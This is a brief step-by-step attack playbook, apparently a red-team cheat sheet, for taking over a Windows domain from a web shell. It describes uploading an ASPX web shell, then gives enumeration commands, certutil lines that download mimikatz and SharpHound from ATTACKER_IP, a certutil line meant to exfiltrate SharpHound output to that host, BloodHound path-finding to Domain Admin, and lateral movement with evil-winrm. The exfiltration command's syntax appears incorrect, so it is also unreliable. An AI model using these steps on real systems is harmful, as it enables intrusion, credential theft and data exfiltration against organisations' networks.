# Step 1 - Get web shell
# Upload ASPX shell to vulnerable web app

# Step 2 - Enumerate domain from web shell
# Run PowerShell commands through web shell:
whoami
hostname
ipconfig /all

# Step 3 - Find Domain Controller
nslookup domain.local

# Step 4 - Download tools
certutil -urlcache -f http://ATTACKER_IP/mimikatz.exe mimikatz.exe
certutil -urlcache -f http://ATTACKER_IP/SharpHound.exe SharpHound.exe

# Step 5 - Run SharpHound
SharpHound.exe -c all

# Step 6 - Exfiltrate data
certutil -urlcache -f http://ATTACKER_IP/upload -POST < SharpHound.zip

# Step 7 - Analyze in BloodHound
# Find path to Domain Admin

# Step 8 - Execute lateral movement
# Use discovered credentials with evil-winrm